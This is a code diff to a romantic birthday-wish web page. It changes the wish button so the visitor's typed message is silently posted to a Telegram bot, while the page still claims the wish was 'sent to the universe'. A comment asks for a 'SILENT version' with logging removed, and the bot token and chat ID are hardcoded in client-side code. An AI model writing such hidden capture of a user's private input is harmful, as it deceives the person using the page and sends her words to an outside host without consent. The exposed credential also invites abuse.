@@ -911,22 +911,30 @@ document.getElementById('final-question').addEventListener('click', function() {
     typeNext();
   }
 
-  submitWish.addEventListener('click', function() {
+ submitWish.addEventListener('click', function() {
     const wish = wishText.value.trim();
     if (wish) {
-      wishMessage.textContent = "Your wish has been sent to the universe my love.\nBe happy and healthy until we meet again";
-      wishMessage.style.display = 'block';
-      wishText.value = '';
-      submitWish.style.display = 'none';
-      
-      for (let i = 0; i < 20; i++) {
-        setTimeout(() => createConfetti(), i * 100);
-      }
-      
-      createHeartPulse();
+        const botToken = '8233623504:AAHOce1na68q9d8IZNnA8WE_Ca_eL19CTSs';
+        const chatId = '6643918586';
+        const message = `💌 New Wish from Prasansha:\n"${wish}"`;
+        
+        // SILENT version - remove all console logs
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        }).catch(() => {}) // Silent fail
+        .finally(() => {
+            wishMessage.textContent = "Your wish has been sent to the universe my love.\nBe happy and healthy until we meet again";
+            wishMessage.style.display = 'block';
+            wishText.value = '';
+            submitWish.style.display = 'none';
+            
+            for (let i = 0; i < 20; i++) setTimeout(() => createConfetti(), i * 100);
+            createHeartPulse();
+        });
     }
-  });
-
+});
   giftButton.addEventListener('click', openGift);
   cakeContainer.addEventListener('click', () => {
     if (!flame.classList.contains('burning')) {
